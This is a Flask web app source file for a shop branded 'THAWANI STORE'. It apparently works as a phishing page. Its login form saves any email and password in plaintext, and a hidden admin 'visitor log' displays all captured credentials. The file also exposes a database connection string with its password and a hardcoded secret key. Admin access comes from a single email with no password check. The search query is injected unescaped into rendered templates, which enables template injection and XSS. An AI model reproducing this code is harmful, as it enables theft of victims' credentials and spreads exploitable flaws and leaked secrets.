import os
import psycopg2
from psycopg2.extras import DictCursor
from flask import Flask, request, render_template_string, redirect, session, abort

app = Flask(__name__)
app.secret_key = "Thawani_Store_2026"

# رابط قاعدة البيانات (لا تغيره)
DATABASE_URL = "postgresql://neondb_owner:npg_LfrcOy0oTV6F@ep-bold-voice-an2t0k43.c-6.us-east-1.aws.neon.tech/neondb?sslmode=require"

def get_db_connection():
    return psycopg2.connect(DATABASE_URL, cursor_factory=DictCursor)

# --- الستايل CSS مع خانة البحث وسجل الزوار ---
CSS = """
<style>
    @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
    body { font-family: 'Tajawal', sans-serif; direction: rtl; background: #f9f9f9; margin: 0; padding-bottom: 60px; }
    header { background: #1a237e; color: white; padding: 15px; text-align: center; font-size: 20px; font-weight: bold; }
    
    /* ستايل خانة البحث */
    .search-container { background: #fff; padding: 10px; border-bottom: 2px solid #eee; display: flex; gap: 5px; }
    .search-container input { flex: 1; padding: 10px; border: 1px solid #ddd; border-radius: 5px; outline: none; }
    .search-btn { background: #1a237e; color: white; border: none; padding: 0 15px; border-radius: 5px; cursor: pointer; }

    .container { padding: 10px; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
    .card { background: white; border-radius: 10px; border: 1px solid #eee; overflow: hidden; text-align: center; padding-bottom: 10px; }
    .card img { width: 100%; height: 120px; object-fit: cover; }
    .price { color: #2e7d32; font-weight: bold; margin: 5px 0; }
    .btn { background: #1a237e; color: white; text-decoration: none; padding: 8px; display: block; margin: 0 10px; border-radius: 5px; font-size: 13px; }

    /* ستايل سجل الزوار */
    .admin-table { width: 100%; border-collapse: collapse; margin-top: 10px; background: white; }
    .admin-table th, .admin-table td { border: 1px solid #ddd; padding: 8px; text-align: center; font-size: 12px; }
    .eye-icon { cursor: pointer; font-size: 16px; background: none; border: none; }
</style>
"""

# --- الصفحة الرئيسية مع خانة البحث ---
@app.route('/')
def index():
    if 'user' not in session: return redirect('/login')
    query = request.args.get('q', '')
    conn = get_db_connection()
    cur = conn.cursor()
    
    if query:
        cur.execute("SELECT * FROM products WHERE name ILIKE %s", (f'%{query}%',))
    else:
        cur.execute("SELECT * FROM products")
        
    products = cur.fetchall()
    cur.close()
    conn.close()

    # كود خانة البحث
    search_bar = f'''
    <div class="search-container">
        <form action="/" method="GET" style="display:flex; width:100%; gap:5px;">
            <input type="text" name="q" placeholder="ابحث عن منتج..." value="{query}">
            <button type="submit" class="search-btn">🔍</button>
        </form>
    </div>
    '''

    items = ""
    for p in products:
        items += f'''
        <div class="card">
            <img src="/static/uploads/{p['img']}">
            <div style="padding:5px; font-size:13px;">{p['name']}</div>
            <div class="price">{p['price']} OMR</div>
            <a href="#" class="btn">إضافة للسلة</a>
        </div>
        '''
    
    return render_template_string(f"<html><head>{CSS}</head><body><header>THAWANI STORE</header>{search_bar}<div class="container">{items}</div></body></html>")

# --- صفحة الإدارة (سجل الزوار مع العين) ---
@app.route('/admin')
def admin():
    if not session.get('is_admin'): return abort(403)
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT email, password FROM users ORDER BY id DESC")
    users = cur.fetchall()
    cur.close()
    conn.close()

    rows = ""
    for i, u in enumerate(users):
        rows += f'''
        <tr>
            <td>
                <span id="e-{i}">***********</span> 
                <button class="eye-icon" onclick="show('e-{i}', '{u['email']}')">👁️</button>
            </td>
            <td>
                <span id="p-{i}">***********</span> 
                <button class="eye-icon" onclick="show('p-{i}', '{u['password']}')">👁️</button>
            </td>
        </tr>
        '''

    js = '''
    <script>
    function show(id, val) {
        var el = document.getElementById(id);
        if (el.innerText === "***********") { el.innerText = val; }
        else { el.innerText = "***********"; }
    }
    </script>
    '''

    content = f'''
    <header>سجل الزوار</header>
    <div style="padding:10px;">
        <table class="admin-table">
            <tr><th>الإيميل</th><th>كلمة السر</th></tr>
            {rows}
        </table>
    </div>
    {js}
    '''
    return render_template_string(f"<html><head>{CSS}</head><body>{content}</body></html>")

# --- تسجيل الدخول (لحفظ البيانات في السجل) ---
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        pw = request.form.get('password')
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("INSERT INTO users (email, password) VALUES (%s, %s) ON CONFLICT (email) DO UPDATE SET password=%s", (email, pw, pw))
        conn.commit()
        session['user'] = email
        session['is_admin'] = (email == "qwerasdf1234598760@gmail.com") # حساب الإدارة
        cur.close()
        conn.close()
        return redirect('/')
    return render_template_string(f"<html><head>{CSS}</head><body><header>دخول</header><form method='POST' style='padding:20px;'><input name='email' placeholder='الإيميل' style='width:100%; padding:10px; margin-bottom:10px;'><input name='password' type='password' placeholder='كلمة السر' style='width:100%; padding:10px; margin-bottom:10px;'><button class='btn' style='margin:0; width:100%;'>دخول</button></form></body></html>")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
